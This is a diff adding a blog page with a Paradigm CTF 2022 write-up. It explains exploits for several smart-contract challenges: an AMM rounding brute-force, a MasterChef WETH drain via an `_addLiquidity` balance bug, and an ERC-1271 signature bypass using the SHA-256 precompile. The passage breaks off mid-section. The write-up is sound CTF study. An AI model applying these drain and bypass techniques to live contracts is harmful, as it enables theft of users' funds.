@@ -1,0 +1,773 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Paradigm CTF WriteUps [Task - 01]</title>
+  <meta name="description" content="Building n Breaking">
+
+  <!-- Social: Twitter -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:site" content="@D4r3_D3v1L_">
+  <meta name="twitter:title" content="Paradigm CTF WriteUps [Task - 01]">
+  <meta name="twitter:description" content="Building n Breaking">
+  
+  <meta property="twitter:image:src" content="http://localhost:4000/potato-hacker-theme/assets/img/opengraph.png">
+  
+
+  <!-- Social: Facebook / Open Graph -->
+  <meta property="og:url" content="http://localhost:4000/potato-hacker-theme/blog/2023/07/25/Task01-Paradigm.html">
+  <meta property="og:title" content="Paradigm CTF WriteUps [Task - 01]">
+  
+  <meta property="og:image" content="http://localhost:4000/potato-hacker-theme/assets/img/opengraph.png">
+  
+  <meta property="og:description" content="Building n Breaking">
+  <meta property="og:site_name" content="jekyll-theme-potato-hacker">
+
+  <!-- Social: Schema.org  -->
+  <meta itemprop="name" content="Paradigm CTF WriteUps [Task - 01]"/>
+  <meta itemprop="description" content="Building n Breaking">
+  <meta itemprop="image" content="http://localhost:4000/potato-hacker-theme/assets/img/opengraph.png"/>
+
+  <!-- Favicon -->
+  <link rel="shortcut icon" href="/potato-hacker-theme/assets/img/icons/favicon.ico" type="image/x-icon" />
+
+  <!-- Android Lolipop Theme Color -->
+  <meta name="theme-color" content="#2a4d14">
+
+  <!-- Styles -->
+  <link rel="stylesheet" id="css-theme" href="/potato-hacker-theme/assets/css/main-dark.css">
+  <link rel="stylesheet" href="/potato-hacker-theme/assets/css/highlight/gruvbox.css">
+  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
+  <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet">
+
+  <!-- Javascript -->
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/d3/4.3.0/d3.min.js"></script>
+  <script type="text/javascript" src="/potato-hacker-theme/assets/js/main.js"></script>
+</head>
+
+
+<body class="animated fadeIn">
+  <div class="container">
+    <div id="background-div">
+      <svg id="background-svg">
+        <lineargradient id="Gradient1" x1="0" x2="0" y1="0" y2="1">
+          <stop stop-opacity="0" class="bgColor2" offset="0%" />
+          <stop stop-opacity="0.5" class="bgColor2" offset="10%" />
+          <stop stop-opacity="0.5" class="bgColor1" offset="40%" />
+          <stop stop-opacity="0" class="bgColor1" offset="100%" />
+        </lineargradient>
+        <g id="bg-layer1"></g>
+        <g id="bg-layer2" class="hide"></g>
+        <g id="bg-layer3"></g>
+        <g id="bg-layer4"></g>
+      </svg>
+    </div>
+    <section class="header">
+      <header>
+	<div class="row">
+		<div class="col-xs-12">
+			<nav class="navbar navbar-default navbar-fixed-top">
+				<div class="container">
+					<div class="navbar-header">
+						<a
+							class="navbar-toggle collapsed navbar-icon"
+							data-toggle="collapse"
+							data-target="#bs-example-navbar-collapse-1"
+						>
+							<i class="fa fa-bars fa-2x"></i>
+						</a>
+						<a
+							class="navbar-brand navbar-icon"
+							href="/potato-hacker-theme/"
+						>
+							<i class="fa fa-home fa-2x"></i>
+						</a>
+					</div>
+
+					<div
+						class="collapse navbar-collapse"
+						id="bs-example-navbar-collapse-1"
+					>
+						<ul class="nav navbar-nav navbar-right">
+							<li>
+								<a href="/potato-hacker-theme/"
+									>Home</a
+								>
+							</li>
+							
+							<li>
+								<a href="/potato-hacker-theme/blog"
+									>Blog</a
+								>
+							</li>
+							
+
+							<!-- 
+                <li class="dropdown dropdown-dropdown1">
+                  <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                    role="button" aria-haspopup="true" aria-expanded="false">dropdown1
+                    <span class="caret"></span>
+                  </a>
+                  <ul class="dropdown-menu dropdown-menu-item1">
+                    <li priority="1"><a href="/potato-hacker-theme/dropdown/dropdown1_item1.html">item1</a></li>
+                  </ul>
+                </li>
+              
+                <li class="dropdown dropdown-dropdown1">
+                  <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                    role="button" aria-haspopup="true" aria-expanded="false">dropdown1
+                    <span class="caret"></span>
+                  </a>
+                  <ul class="dropdown-menu dropdown-menu-item2">
+                    <li priority="2"><a href="/potato-hacker-theme/dropdown/dropdown1_item2.html">item2</a></li>
+                  </ul>
+                </li>
+              
+                <li class="dropdown dropdown-dropdown1">
+                  <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                    role="button" aria-haspopup="true" aria-expanded="false">dropdown1
+                    <span class="caret"></span>
+                  </a>
+                  <ul class="dropdown-menu dropdown-menu-item3">
+                    <li priority="3"><a href="/potato-hacker-theme/dropdown/dropdown1_item3.html">item3</a></li>
+                  </ul>
+                </li>
+              
+                <li class="dropdown dropdown-dropdown2">
+                  <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                    role="button" aria-haspopup="true" aria-expanded="false">dropdown2
+                    <span class="caret"></span>
+                  </a>
+                  <ul class="dropdown-menu dropdown-menu-item1">
+                    <li priority=""><a href="/potato-hacker-theme/dropdown/dropdown2_item1.html">item1</a></li>
+                  </ul>
+                </li>
+              
+                <li class="dropdown dropdown-dropdown2">
+                  <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                    role="button" aria-haspopup="true" aria-expanded="false">dropdown2
+                    <span class="caret"></span>
+                  </a>
+                  <ul class="dropdown-menu dropdown-menu-item2">
+                    <li priority=""><a href="/potato-hacker-theme/dropdown/dropdown2_item2.html">item2</a></li>
+                  </ul>
+                </li>
+              
+                <li class="dropdown dropdown-dropdown3">
+                  <a href="#" class="dropdown-toggle" data-toggle="dropdown"
+                    role="button" aria-haspopup="true" aria-expanded="false">dropdown3
+                    <span class="caret"></span>
+                  </a>
+                  <ul class="dropdown-menu dropdown-menu-item1">
+                    <li priority=""><a href="/potato-hacker-theme/dropdown/dropdown3_item1.html">item1</a></li>
+                  </ul>
+                </li>
+               -->
+							
+							<li class="nav-item">
+								<a
+									href="/potato-hacker-theme/items/about.html"
+									>About</a
+								>
+							</li>
+							
+
+							<script>
+								// clean repeated dropdowns and add <li> to their positions
+								let done = [];
+								let elements = [];
+								$(".dropdown")
+								  //
+								  .each((index0 , value0) => {
+								    let dropdownClass = "."+$(value0)[0].classList[1];
+								    if (done.indexOf(dropdownClass) !== -1) return
+								    done.push(dropdownClass)
+								    let dropdownMain = $(dropdownClass)[0]
+								    let itemsList = $(dropdownClass+">ul>li").sort((a, b) => parseInt(b.getAttribute("priority") || -9999999) - parseInt(a.getAttribute("priority") || -9999999))
+								    $(dropdownClass+">ul>li").remove();
+								    $(dropdownClass+">ul").append(itemsList)
+								    $(dropdownClass).remove();
+								    elements.push(dropdownMain)
+								});
+								let priority = [ "About", ];
+								elements = elements.concat(...$(".nav-item").remove())
+								priority.map(text => {
+								  elements = elements.filter(node => {
+								      let nodeText = node.querySelector("a").textContent.trim()
+								      if (text == nodeText) {
+								          $(".nav").append(node)
+								          return false;
+								      }
+								      return true;
+								  })
+								});
+								$(".nav").append(elements)
+							</script>
+						</ul>
+					</div>
+				</div>
+			</nav>
+		</div>
+	</div>
+</header>
+
+    </section>
+    <section class="content">
+      <div class="row">
+        <!-- <div class="col-sm-2">
+          <div class="pane-separator hidden-xs" style="margin-bottom:30em;"></div>
+          <div class="left-pane">
+          </div>
+        </div> -->
+        <div class="col-sm-8 col-sm-offset-2 content-div">
+          <div class="page-separator hidden-xs">
+            <h1 class="h1-strip" style="padding-bottom:8em; margin-bottom: 0;"></h1>
+          </div>
+          <div class="page-separator visible-xs">
+            <h1 class="h1-strip" style="padding-bottom:2em; margin-bottom: 0;"></h1>
+          </div>
+          <h1 class="post-title page-title" id="title"><a href="#title">Paradigm CTF WriteUps [Task - 01]</a></h1>
+          <h4 class="post-title"> 2023-07-25 14:37:16 +0530 </h4>
+<article class="blog-post">
+  <p>This is the first task,Need to solve some of the challenges in Paradigm CTF 2022.</p>
+
+<!--more-->
+
+<h2 id="otter-world-">OTTER-WORLD :</h2>
+
+<p>This is a sanity check challenge where we need to pass a number and call the function.</p>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nn">chall</span><span class="p">::</span><span class="nn">cpi</span><span class="p">::</span><span class="nf">get_flag</span><span class="p">(</span><span class="n">cpi_ctx</span><span class="p">,</span> <span class="mi">0x1337</span> <span class="cm">/* TODO */</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Place 0x7331 in place of TODO and run ./ruh.sh</p>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nn">chall</span><span class="p">::</span><span class="nn">cpi</span><span class="p">::</span><span class="nf">get_flag</span><span class="p">(</span><span class="n">cpi_ctx</span><span class="p">,</span> <span class="mi">0x1337</span> <span class="o">*</span> <span class="mi">0x7331</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+</code></pre></div></div>
+
+<h2 id="otterswap-">OTTERSWAP :</h2>
+
+<p>Here we have a swap functionality like from a to b and vice versa.
+Initially the program has 2 pool accounts (pool_a and pool_b) and user_in_account and user_out_account.
+It is calculating the out amount by a formula .</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>let x = in_pool_account.amount;
+let y = out_pool_account.amount;
+let out_amount = y - (x * y) / (x + amount);
+</code></pre></div></div>
+
+<p>It has a rounding issue which will result in lower balance in pools after the swap.
+To know how much amount we need to send to get maximum tokens , I wrote a simple bruteforce function in python.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">swap</span><span class="p">(</span><span class="n">pool_a</span> <span class="p">,</span> <span class="n">pool_b</span><span class="p">,</span> <span class="n">user_in</span><span class="p">,</span> <span class="n">user_out</span><span class="p">):</span>
+    <span class="n">res</span> <span class="o">=</span> <span class="bp">None</span>
+    <span class="n">max_swap_amt</span> <span class="o">=</span> <span class="mi">0</span>
+
+    <span class="k">for</span> <span class="n">user_in_amt</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">user_in</span><span class="o">+</span><span class="mi">1</span><span class="p">):</span>
+        <span class="n">x</span> <span class="o">=</span> <span class="n">pool_a</span>
+        <span class="n">y</span> <span class="o">=</span> <span class="n">pool_b</span>
+        <span class="n">out_amount</span> <span class="o">=</span> <span class="n">y</span> <span class="o">-</span> <span class="p">(</span><span class="n">x</span> <span class="o">*</span> <span class="n">y</span><span class="p">)</span> <span class="o">//</span> <span class="p">(</span><span class="n">x</span> <span class="o">+</span> <span class="n">user_in_amt</span><span class="p">)</span>
+        <span class="n">user_in_mod</span> <span class="o">=</span> <span class="n">user_in</span> <span class="o">-</span> <span class="n">user_in_amt</span>
+        <span class="n">user_out_mod</span> <span class="o">=</span> <span class="n">user_out</span> <span class="o">+</span> <span class="n">out_amount</span>
+        <span class="n">pool_a_mod</span> <span class="o">=</span> <span class="n">pool_a</span> <span class="o">+</span> <span class="n">user_in_amt</span>
+        <span class="n">pool_b_mod</span> <span class="o">=</span> <span class="n">pool_b</span> <span class="o">-</span> <span class="n">out_amount</span>
+
+        <span class="k">for</span> <span class="n">user_in_amt_mod</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">user_out_mod</span><span class="o">+</span><span class="mi">1</span><span class="p">):</span>
+            <span class="n">x</span> <span class="o">=</span> <span class="n">pool_b_mod</span>
+            <span class="n">y</span> <span class="o">=</span> <span class="n">pool_a_mod</span>
+            <span class="c1"># print(f" x and y {x} - {y} amt {user_in_amt_mod}")
+</span>            <span class="n">out_amount</span> <span class="o">=</span> <span class="n">y</span> <span class="o">-</span> <span class="p">(</span><span class="n">x</span> <span class="o">*</span> <span class="n">y</span><span class="p">)</span> <span class="o">//</span> <span class="p">(</span><span class="n">x</span> <span class="o">+</span> <span class="n">user_in_amt_mod</span><span class="p">)</span>
+            <span class="n">user_out_mod1</span> <span class="o">=</span> <span class="n">user_out_mod</span> <span class="o">-</span> <span class="n">user_in_amt_mod</span>
+            <span class="n">user_in_mod1</span> <span class="o">=</span> <span class="n">user_in_mod</span> <span class="o">+</span> <span class="n">out_amount</span>
+            <span class="n">pool_b_mod1</span> <span class="o">=</span> <span class="n">pool_b_mod</span> <span class="o">+</span> <span class="n">user_in_amt_mod</span>
+            <span class="n">pool_a_mod1</span> <span class="o">=</span> <span class="n">pool_a_mod</span> <span class="o">-</span> <span class="n">out_amount</span>
+
+            <span class="k">if</span> <span class="n">user_in_mod1</span> <span class="o">+</span> <span class="n">user_out_mod1</span> <span class="o">&gt;</span> <span class="n">max_swap_amt</span><span class="p">:</span>
+                <span class="n">max_swap_amt</span> <span class="o">=</span> <span class="n">user_in_mod1</span> <span class="o">+</span> <span class="n">user_out_mod1</span>
+                <span class="n">res</span> <span class="o">=</span> <span class="p">(</span><span class="n">user_in_amt</span><span class="p">,</span><span class="n">user_in_amt_mod</span><span class="p">,</span><span class="n">pool_a_mod1</span><span class="p">,</span><span class="n">pool_b_mod1</span><span class="p">,</span><span class="n">user_in_mod1</span><span class="p">,</span><span class="n">user_out_mod1</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">res</span>
+
+<span class="n">pool_a</span> <span class="o">=</span> <span class="mi">10</span>
+<span class="n">pool_b</span> <span class="o">=</span> <span class="mi">10</span>
+<span class="n">user_in</span> <span class="o">=</span> <span class="mi">10</span>
+<span class="n">user_out</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="n">user_in_amt</span> <span class="p">,</span> <span class="n">user_out_amt</span> <span class="p">,</span> <span class="n">pool_a</span><span class="p">,</span><span class="n">pool_b</span><span class="p">,</span><span class="n">user_in</span><span class="p">,</span><span class="n">user_out</span> <span class="o">=</span> <span class="n">swap</span><span class="p">(</span><span class="n">pool_a</span><span class="p">,</span><span class="n">pool_b</span><span class="p">,</span><span class="n">user_in</span><span class="p">,</span><span class="n">user_out</span><span class="p">)</span>
+
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"swap </span><span class="si">{</span><span class="n">user_in_amt</span><span class="si">}</span><span class="s"> A to B"</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"swap </span><span class="si">{</span><span class="n">user_out_amt</span><span class="si">}</span><span class="s"> B to A"</span><span class="p">)</span>
+    <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"total amt -------------------   </span><span class="si">{</span><span class="n">user_in</span> <span class="o">+</span> <span class="n">user_out</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="k">if</span> <span class="n">user_in</span> <span class="o">+</span> <span class="n">user_out</span> <span class="o">==</span> <span class="mi">29</span><span class="p">:</span>
+        <span class="k">break</span>
+</code></pre></div></div>
+
+<p>The output will have the amount and direction of the swaps.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>swap 7 A to B
+swap 3 B to A
+total amt -------------------   12
+swap 4 A to B
+swap 3 B to A
+total amt -------------------   14
+swap 3 A to B
+swap 2 B to A
+total amt -------------------   16
+swap 10 A to B
+swap 3 B to A
+total amt -------------------   19
+swap 10 A to B
+swap 2 B to A
+total amt -------------------   22
+swap 11 A to B
+swap 1 B to A
+total amt -------------------   29
+</code></pre></div></div>
+
+<p>We have only one cpi_ctx in the solve program and it is for a_to_b direction so we need to create another cpi_ctx for b_to_a.</p>
+
+<p>By sending all the swaps like in the above output, you will have the 29 tokens.</p>
+
+<h2 id="random-">RANDOM :</h2>
+
+<p>This is a sanity check challenge where we need to pass the number 4 in the solve(uint256 guess) function .</p>
+
+<h2 id="rescue-">RESCUE :</h2>
+
+<p>The setup contract accidentally transferred 10 weth(ERC20Like) to the MasterChef contract.</p>
+
+<p>Our goal is to drain the weth in the MasterChef contract :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>return weth.balanceOf(address(mcHelper)) == 0;
+</code></pre></div></div>
+
+<p>The MasterChef contract has one external function <code class="language-plaintext highlighter-rouge">swapTokenForPoolToken</code></p>
+
+<p>Which takes in a token and a pool id .It swaps half of our token to tokenOut0 of the pool and tokenOut1 of the pool.</p>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">_swap</span><span class="p">(</span><span class="n">tokenIn</span><span class="p">,</span> <span class="n">tokenOut0</span><span class="p">,</span> <span class="n">amountIn</span> <span class="o">/</span> <span class="mi">2</span><span class="p">);</span>
+<span class="n">_swap</span><span class="p">(</span><span class="n">tokenIn</span><span class="p">,</span> <span class="n">tokenOut1</span><span class="p">,</span> <span class="n">amountIn</span> <span class="o">/</span> <span class="mi">2</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>After that it adds the tokenOut0 and tokenOut1 to the pool by using <code class="language-plaintext highlighter-rouge">_addLiquidity</code> Function.</p>
+
+<h3 id="bug">Bug:</h3>
+
+<p>There is issue with the <code class="language-plaintext highlighter-rouge">_addLiquidity</code> function , it is adding the all the amount in the contract of the token not the amount which is came from swaps.</p>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ERC20Like</span><span class="p">(</span><span class="n">token0</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)),</span> <span class="n">ERC20Like</span><span class="p">(</span><span class="n">token1</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)),</span>
+</code></pre></div></div>
+
+<p>So if one of the <code class="language-plaintext highlighter-rouge">tokenOut0</code> or <code class="language-plaintext highlighter-rouge">tokenOut1</code> is weth we can add the whole weth in the contract to the pool , this will drain all the weth in our contract .</p>
+
+<p>Here we need to use a tokenIn which is other than the <code class="language-plaintext highlighter-rouge">tokenOut1</code> and <code class="language-plaintext highlighter-rouge">tokenOut0</code> and It should have enough pool to make swap.</p>
+
+<p>So we can use dai token for this and 1 for poolId . poolId 1 have weth/usdc and weth to dai and weth to usdc pools also available .</p>
+
+<p>First we deposit 20 ether to the weth . Then swaps 10 ether worth weth to usdc using router.</p>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">path</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="n">weth</span><span class="p">);</span>
+       <span class="n">path</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">usdc</span><span class="p">;</span>
+       <span class="n">router</span><span class="p">.</span><span class="n">swapExactTokensForTokens</span><span class="p">(</span>
+           <span class="mi">10</span> <span class="kc">ether</span><span class="p">,</span>
+           <span class="mi">0</span><span class="p">,</span>
+           <span class="n">path</span><span class="p">,</span>
+           <span class="kt">address</span><span class="p">(</span><span class="n">mcHelper</span><span class="p">),</span>
+           <span class="n">block</span><span class="p">.</span><span class="n">timestamp</span>
+       <span class="p">);</span>
+</code></pre></div></div>
+
+<p>This will add the 10 ether worth usdc to Masterchef contract.</p>
+
+<p>Same way we swap weth for dai to our contract.</p>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      <span class="n">path</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="n">weth</span><span class="p">);</span>
+      <span class="n">path</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">dai</span><span class="p">;</span>
+       <span class="n">router</span><span class="p">.</span><span class="n">swapExactTokensForTokens</span><span class="p">(</span>
+           <span class="mi">10</span> <span class="kc">ether</span><span class="p">,</span>
+           <span class="mi">0</span><span class="p">,</span>
+           <span class="n">path</span><span class="p">,</span>
+           <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span>
+           <span class="n">block</span><span class="p">.</span><span class="n">timestamp</span>
+       <span class="p">);</span>
+</code></pre></div></div>
+
+<p>Now we have 10ether worth DAI in our attacker contract . 10 ether worth WETH in MasterChef contract and 10ether worth USDC in MasterChef contract.</p>
+
+<p>So if we call the swapTokenForPoolToken using poolId as 1 and token as DAI with the amount of the DAI ,</p>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">mcHelper</span><span class="p">.</span><span class="n">swapTokenForPoolToken</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">dai</span><span class="p">,</span> <span class="n">ERC20Like</span><span class="p">(</span><span class="n">dai</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)),</span> <span class="mi">0</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>This will drain the weth in the Masterchef contract.</p>
+
+<h2 id="vanity-">VANITY :</h2>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="k">function</span> <span class="n">solve</span><span class="p">(</span><span class="kt">address</span> <span class="n">signer</span><span class="p">,</span> <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">signature</span><span class="p">)</span> <span class="k">external</span> <span class="p">{</span>
+        <span class="nb">require</span><span class="p">(</span><span class="n">SignatureChecker</span><span class="p">.</span><span class="n">isValidSignatureNow</span><span class="p">(</span><span class="n">signer</span><span class="p">,</span> <span class="n">MAGIC</span><span class="p">,</span> <span class="n">signature</span><span class="p">),</span> <span class="s">"Challenge/invalidSignature"</span><span class="p">);</span>
+
+        <span class="n">solve</span><span class="p">(</span><span class="n">signer</span><span class="p">);</span>
+    <span class="p">}</span>
+
+
+  <span class="k">function</span> <span class="n">solve</span><span class="p">(</span><span class="kt">address</span> <span class="n">who</span><span class="p">)</span> <span class="k">private</span> <span class="p">{</span>
+        <span class="kt">uint</span> <span class="n">score</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+        <span class="k">for</span> <span class="p">(</span><span class="kt">uint</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">20</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="k">if</span> <span class="p">(</span><span class="kt">bytes20</span><span class="p">(</span><span class="n">who</span><span class="p">)[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="n">score</span><span class="o">++</span><span class="p">;</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="n">score</span> <span class="o">&gt;</span> <span class="n">bestScore</span><span class="p">)</span> <span class="n">bestScore</span> <span class="o">=</span> <span class="n">score</span><span class="p">;</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+
+<p>To solve this challenge we need to pass a signature check and the signer address should have 16 0s in it.</p>
+
+<p>By checking the <code class="language-plaintext highlighter-rouge">isValidSignatureNow</code> function.</p>
+
+<div class="language-solidity highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="k">function</span> <span class="n">isValidSignatureNow</span><span class="p">(</span>
+        <span class="kt">address</span> <span class="n">signer</span><span class="p">,</span>
+        <span class="kt">bytes32</span> <span class="n">hash</span><span class="p">,</span>
+        <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">signature</span>
+    <span class="p">)</span> <span class="k">internal</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
+        <span class="p">(</span><span class="kt">address</span> <span class="n">recovered</span><span class="p">,</span> <span class="n">ECDSA</span><span class="p">.</span><span class="n">RecoverError</span> <span class="n">error</span><span class="p">)</span> <span class="o">=</span> <span class="n">ECDSA</span><span class="p">.</span><span class="n">tryRecover</span><span class="p">(</span><span class="n">hash</span><span class="p">,</span> <span class="n">signature</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">error</span> <span class="o">==</span> <span class="n">ECDSA</span><span class="p">.</span><span class="n">RecoverError</span><span class="p">.</span><span class="n">NoError</span> <span class="o">&amp;&amp;</span> <span class="n">recovered</span> <span class="o">==</span> <span class="n">signer</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="p">(</span><span class="kt">bool</span> <span class="n">success</span><span class="p">,</span> <span class="kt">bytes</span> <span class="k">memory</span> <span class="n">result</span><span class="p">)</span> <span class="o">=</span> <span class="n">signer</span><span class="p">.</span><span class="n">staticcall</span><span class="p">(</span>
+            <span class="n">abi</span><span class="p">.</span><span class="n">encodeWithSelector</span><span class="p">(</span><span class="n">IERC1271</span><span class="p">.</span><span class="n">isValidSignature</span><span class="p">.</span><span class="nb">selector</span><span class="p">,</span> <span class="n">hash</span><span class="p">,</span> <span class="n">signature</span><span class="p">)</span>
+        <span class="p">);</span>
+        <span class="k">return</span> <span class="p">(</span><span class="n">success</span> <span class="o">&amp;&amp;</span> <span class="n">result</span><span class="p">.</span><span class="n">length</span> <span class="o">==</span> <span class="mi">32</span> <span class="o">&amp;&amp;</span> <span class="n">abi</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="n">result</span><span class="p">,</span> <span class="p">(</span><span class="kt">bytes4</span><span class="p">))</span> <span class="o">==</span> <span class="n">IERC1271</span><span class="p">.</span><span class="n">isValidSignature</span><span class="p">.</span><span class="nb">selector</span><span class="p">);</span>
+    <span class="p">}</span>
+</code></pre></div></div>
+
+<p>We can’t use a normal address here , and I found this site https://www.evm.codes/precompiled#0x02?fork=merge.</p>
+
+<p>Look at the second condition where the contract making a staticcall to the signer and checking the result[4] bytes is equals to the isValidSignature.selector.
+We can use the address 0x2 for this as it is a sha256 function. The staticcall will return the sha256 of the</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> abi.encodeWithSelector(IERC1271.isValidSignature.selector, hash, signature)
+</code></pre></div></div>
+
+<p>If the 4 bytes of the result is equal to <code class="language-plaintext highlighter-rouge">isValidSignature.selector</code> It will return true.</p>
+
+<p>We need to pass the valid signature to get the hash starting with isValidSignature.selector.</p>
+
+<p>Wrote a python script but my laptop can’t withstand that bruteforce.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">hashlib</span>
+<span class="err">!</span><span class="n">pip</span> <span class="n">install</span> <span class="n">eth_abi</span>
+<span class="kn">from</span> <span class="nn">eth_abi</span> <span class="kn">import</span> <span class="n">encode</span> <span class="k">as</span> <span class="n">encode_abi</span>
+
+<span class="k">def</span> <span class="nf">sha256</span><span class="p">(</span><span class="n">dat</span><span class="p">):</span>
+   <span class="n">dat</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">dat</span><span class="p">)</span>
+   <span class="n">m</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">sha256</span><span class="p">()</span>
+   <span class="n">m</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="n">dat</span><span class="p">)</span>
+   <span class="k">return</span> <span class="n">m</span><span class="p">.</span><span class="n">digest</span><span class="p">().</span><span class="nb">hex</span><span class="p">()</span>
+
+<span class="n">x</span> <span class="o">=</span> <span class="s">"1626ba7e"</span>
+<span class="n">hash_val</span> <span class="o">=</span> <span class="s">"19bb34e293bba96bf0caeea54cdd3d2dad7fdf44cbea855173fa84534fcfb528"</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1000000000</span><span class="p">):</span>
+   <span class="n">signature</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+   <span class="n">data</span> <span class="o">=</span> <span class="n">encode_abi</span><span class="p">([</span><span class="s">'bytes4'</span><span class="p">,</span> <span class="s">'bytes32'</span><span class="p">,</span> <span class="s">'bytes'</span><span class="p">],</span> <span class="p">[</span><span class="nb">bytes</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">x</span><span class="p">),</span> <span class="nb">bytes</span><span class="p">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">hash_val</span><span class="p">),</span> <span class="n">signature</span><span class="p">.</span><span class="n">encode</span><span class="p">()])</span>
+   <span class="k">if</span> <span class="n">sha256</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="nb">hex</span><span class="p">()).</span><span class="n">startswith</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+       <span class="k">print</span><span class="p">(</span><span class="s">"Found matching signature: "</span> <span class="o">+</span> <span class="n">signature</span><span class="p">)</span>
+       <span class="k">break</span>
+</code></pre></div></div>
+
+<h2 id="solhana-1-">SOLHANA 1 :</h2>
+
+<p>This program allows users to deposit and withdraw tokens .
+Lets check the functions</p>
+
+<p>Setup_for_player - It create a state account and storing deposit account and deposit mint in it.</p>
+
+<p>Deposit - it transfers amount of tokens from depositor account to deposit account and mint the same amount of voucher mint to the depositor_voucher_account .</p>
+
